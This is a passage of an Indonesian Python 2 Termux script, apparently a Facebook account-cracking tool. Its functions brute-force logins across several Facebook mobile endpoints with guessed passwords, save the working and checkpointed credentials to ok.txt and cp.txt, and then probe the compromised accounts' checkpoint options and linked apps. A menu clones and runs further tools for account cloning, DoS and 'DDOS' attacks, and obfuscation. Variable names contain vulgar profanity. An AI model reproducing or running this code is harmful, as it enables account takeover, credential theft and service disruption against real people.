         'Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]'])
	global ua_de, ok, cp, loop, token
	rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
	sys.stdout.write(
		"\r %s[Crack] %s/%s OK:-%s - CP:-%s "%(rm,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		qobil = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobile(uid, pwcuk):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
	global ua_de, ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		qobil = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
#d.fb
def xfb(uid, pwcuk):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
	global ua_de, ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://x.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "x.facebook.com", "referer": "https://x.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://x.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		qobil = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1	

def dfb(uid, pwcuk):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
	global ua_de, ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		qobil = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1
	
def freefb(uid, pwcuk):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
	global ua_de, ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		qobil = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1				

def hasil():
	if len(ok) != 0 or len(cp) != 0:
		exit(proff.langsung())
	else:
		exit("\n%s [%s•%s] Jomblo ya? :v\n%s [%s!%s] Makanya gak dapat hasil :v"%(p,k,p,p,m,p))

def langsung():
    global token
    silet = raw_input("\n %s[%s•%s] Check Option Account Sesi? y/n\n%s [%s•%s] Choose: "%(p,k,p,p,k,p))
    if silet in ["y","Y"]:
        option_sesi()
    elif silet in ["n","N"]:
        os.remove('checkcp.txt')
        menu()
    else: 
        exit("\n%s [%s!%s] Unknown!"%(p,m,p))

# Check Option Crack Langsung ###
def option_sesi():
	files = ("checkcp.txt")
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split(" | ")
		print("\n\033[0;93m\033[0;97m [\033[1;33m•\033[1;37m] Account : "+(kontol.replace(" + ","")))
		try:
			asui(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('checkcp.txt')
	exit("\n%s [%s✓%s] Done"%(p,h,p))

def asui(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;93m\033[0;97m [\033[1;33m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;93m\033[0;97m [\033[1;33m•\033[1;37m] Total Opsi Yang Tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[1;33m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	else:
		print("%s [%s!%s] Error Login Failed!\n"%(p,m,p))


#+#+#+#+#+#+#+#+#+#+#+#+#+##++##+#+#+#+#+#+#+#+#+#++#+#

def cek_opsi_sesi():
	files = raw_input("\n %s[%s•%s] Cheking optional account sesi\n %s[%s•%s] Files: "%(p,k,p,p,k,p))
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split(" | ")
		print("\n\033[0;93m\033[0;97m [\033[1;33m•\033[1;37m] Account : "+(kontol.replace(" + ","")))
		try:
			profcheck(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('cp.txt')
	exit("\n%s [%s✓%s] Done"%(p,h,p))
	

#tips & trick
def tips():
    os.system("clear")
    print("\n\n \033[41m\033[1;37m[ SETTING APN ]\x1b[0m \n")
    print(" Pilih Kartu : ")
    print(" %s[%s01%s] Indosat "%(p,k,p))
    print(" %s[%s02%s] Telkomsel "%(p,k,p))
    print(" %s[%s03%s] Tree "%(p,k,p))
    print(" %s[%s04%s] Smartfren "%(p,k,p))
    print(" %s[%s05%s] Xl/Axis "%(p,k,p))
    print(" %s[%s06%s] By.u "%(p,k,p))
    print(" %s[%s00%s] Back "%(p,k,p))
    kartu = raw_input("\n\n %s "%(panah))
    if kartu in ["1","01"]:
      indosat()
    elif kartu in ["2","02"]:
        telkomsel()
    elif kartu in ["3","03"]:
        three()
    elif kartu in ["4","04"]:
        smartfren()
    elif kartu in ["5","05"]:
        xl()
    elif kartu in ["6","06"]:
        byu()                
    else:
      os.system("python2 proff.py")
      exit() 

def indosat():
    print("\n\n APN INDOSAT\n")    	
    print(" • Name          : Indosat Super Fast ")
    print(" • APN           : Indosatgprs ")
    print(" • Proxy         : 10.19.19.19 ")
    print(" • Port          : 8080 ")
    print(" • Username      : indosat ")
    print(" • Password      : indosat ")
    print(" • MCC           : 510 ")
    print(" • MNC           : 01 ")
    print(" • APN Type      : default,supl ")
    print(" • APN Protocol  : Ipv4 ")
    print(" • APN roaminng  : Ipv4 ")
    raw_input("\n\n BACK ")
    tips()

def telkomsel():
    print("\n\n APN TELKOMSEL\n")    	
    print(" • Name          : Telkomsel 4G LTE Stabil ")
    print(" • APN           : TELKOMSELBRN1 ")
    print(" • Proxy         : 10.1.89.130 ")
    print(" • Port          : 8000 ")
    print(" • Username      : Default ")
    print(" • Password      : Default ")
    print(" • Server        : Default ")
    print(" • MMSC          : Default ")
    print(" • MMS Proxy     : Default ")
    print(" • MMS Port      : Default ")
    print(" • MCC           : 510 ")
    print(" • MNC           : 10 ")
    print(" • Auth. Type    : Not Set ")
    print(" • APN Type      : default ")
    print(" • APN Protocol  : Ipv4 ")
    print(" • APN roaming   : Ipv4 ")
    print(" • Enb/Disb      : APN Enable ")
    print(" • Bearer        : Unspecified ")
    print(" • MVNO Type     : None ")
    print(" • MVNO Value    : Default ")
    raw_input("\n\n BACK ")
    tips()

def three():
    print("\n\n APN THREE 3\n")    	
    print(" • Name          : Hutchison ")
    print(" • APN           : Hutchison ")
    print(" • Proxy         : None ")
    print(" • Port          : None ")
    print(" • Username      : 3gprs ")
    print(" • Password      : 3gprs ")
    print(" • Server        : None ")
    print(" • MMSC          : None ")
    print(" • MMS Proxy     : None ")
    print(" • MMS Port      : None ")
    print(" • MCC           : 510 ")
    print(" • MNC           : 89 ")
    print(" • Auth. Type    : Pap Or Chap ")
    print(" • APN Type      : default,supl ")
    print(" • APN Protocol  : Ipv4 ")
    print(" • APN roaming   : Ipv4 ")
    print(" • Enb/Disb      : APN Enable ")
    print(" • Bearer        : Unspecified ")
    print(" • MVNO Type     : None ")
    print(" • MVNO Value    : None ")
    raw_input("\n\n BACK ")
    tips()	

def smartfren():    
    print("\n\n APN SMARTFREN\n")    	
    print(" • Name          : Smartfren4G ")
    print(" • APN           : real.globe.com.ph ")
    print(" • Proxy         : 141.0.11.241 ")
    print(" • Port          : None ")
    print(" • Username      : smartfren ")
    print(" • Password      : smartfren ")
    print(" • Server        : None ")
    print(" • MMSC          : None ")
    print(" • MMS Proxy     : None ")
    print(" • MMS Port      : None ")
    print(" • MCC           : 510 ")
    print(" • MNC           : 28 ")
    print(" • Auth. Type    : Pap Or Chap ")
    print(" • APN Type      : default,supl,xcap ")
    print(" • APN Protocol  : Ipv4/Ipv6 ")
    print(" • APN roaming   : Ipv4/Ipv6 ")
    print(" • Enb/Disb      : APN Enable ")
    print(" • Bearer        : Unspecified ")
    print(" • MVNO Type     : None ")
    print(" • MVNO Value    : None ")
    raw_input("\n\n BACK ")
    tips() 
    
def xl():    
    print("\n\n APN XL\n")    	
    print(" • Name          : XL 4G ")
    print(" • APN           : www.xl4g.net ")
    print(" • Proxy         : 202.152.240.50 ")
    print(" • Port          : 80 ")
    print(" • Username      : - ")
    print(" • Password      : - ")
    print(" • Server        : - ")
    print(" • MMSC          : - ")
    print(" • MMS Proxy     : - ")
    print(" • MMS Port      : - ")
    print(" • MCC           : - ")
    print(" • MNC           : - ")
    print(" • Auth. Type    : - ")
    print(" • APN Type      : - ")
    print(" • APN Protocol  : Ipv4/Ipv6 ")
    print(" • APN roaming   : Ipv4/Ipv6 ")
    print(" • Enb/Disb      : APN Enable ")
    print(" • Bearer        : Unspecified ")
    print(" • MVNO Type     : None ")
    print(" • MVNO Value    : None ")
    raw_input("\n\n BACK ")
    tips()    

def byu():    
    print("\n\n APN BY.U\n")    	
    print(" • Name          : ProfByu ")
    print(" • APN           : internet.mib ")
    print(" • Proxy         : - ")
    print(" • Port          : - ")
    print(" • Username      : - ")
    print(" • Password      : - ")
    print(" • Server        : - ")
    print(" • MMSC          : http://www.time4lime.com ")
    print(" • MMS Proxy     : - ")
    print(" • MMS Port      : - ")
    print(" • MCC           : - ")
    print(" • MNC           : - ")
    print(" • Auth. Type    : Pap ")
    print(" • APN Type      : Default ")
    print(" • APN Protocol  : Ipv4 ")
    print(" • APN roaming   : Ipv4 ")
    print(" • Enb/Disb      : APN Enable ")
    print(" • Bearer        : LTE ")
    print(" • MVNO Type     : None ")
    print(" • MVNO Value    : None ")
    raw_input("\n\n BACK ")
    tips()          
#tools lain

def goblak():
#time.sleep(1.5)
#bersih()
 os.system("clear")
 speed("\n\n          \033[41m\033[1;37m[ MENU TOOLS ]\x1b[0m")
 speed("\n \033[1;36m╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m1. Crack Facebook V.3.1")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m2. Cloning FB Ruby")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m3. SMS Gratis")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" \033[1;36m╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m4. Perl DOS18+")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m5. KIRI-KANAN Symbol")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m6. Info Gathering FB")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m7. Beban Berat DDOS")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m8. Obfuscate Anti Decompile")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" \033[1;36m╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m9. Ikuti Github Author")
 speed(" \033[1;36m╚══════════════════════════════╝")

 speed(" ╔══════════════════════════════╗")
 speed(" ╠═\033[1;91m▶ \033[1;33m0. Main Menu")
 speed(" \033[1;36m╚══════════════════════════════╝")
 pil = raw_input("\n %s "%(panah2))
 run_indo()
 #if/else/data
 if pil =="1":
   time.sleep(1.5)
   os.system("cd /data/data/com.termux/files/home")
   os.system("git clone https://github.com/KangProf/premium")
   os.system("cd premium && python2 premfree.py") 
 #2if
 elif pil =="2":
   time.sleep(1.5)
   os.system("cd /data/data/com.termux/files/home")
   os.system("pkg install ruby")
   os.system("git clone https://github.com/KangProf/RubFB")
   os.system("cd RubFB && ruby cloning.rb")
 #3if
 elif pil =="3":
   time.sleep(1.5)
   os.system("cd /data/data/com.termux/files/home")
   os.system("git clone https://github.com/KangProf/freesms")
   os.system("cd freesms && python free.py")
   #os.system("python2 virtex.py")
 #4if
 elif pil =="4":
   os.system("cd /data/data/com.termux/files/home")
   os.system("pkg install perl")
   os.system("git clone https://github.com/KangProf/DOS18") 
   os.system("cd DOS18 && perl DoS18.pl")
 #5if
 elif pil =="5":
   os.system("cd /data/data/com.termux/files/home")
   os.system("git clone https://github.com/KangProf/KiriKanan")
   os.system("cd KiriKanan && python set.py")
 #6if
 elif pil =="6":
   os.system("cd /data/data/com.termux/files/home")
   os.system("pip install pythondialog")
   os.system("git clone https://github.com/KangProf/informasi")
   os.system("cd informasi && python get.py")
 #7if
 elif pil =="7":
   run_indo()
   os.system("cd /data/data/com.termux/files/home")
   os.system("git clone https://github.com/KangProf/BEBAN")
   os.system("cd BEBAN && python2 Berat.py")
 #8if
 elif pil =="8":
   run_indo()
   os.system("cd /data/data/com.termux/files/home")
   os.system("pkg install bash")
   os.system("git clone https://github.com/KangProf/Obfuscate")
   os.system("cd Obfuscate && python ENCDEC.py")
 #9if
 elif pil =="9":
   mengetik("jangan lupa follow github admin ya brouther...see you :)")
   os.system("xdg-open https://github.com/KangProf")
   time.sleep(3)
   menu()   
 elif pil =="0":
   menu()
 else:
	os.system("python2 proff.py")
 exit()   
#hshshshshsh 
sesi = []
san_manual = []
gak_gabung = []
sandi_gabung = []
angka_nama = []
pilih = []
san_ttl = []
pw_tap = []

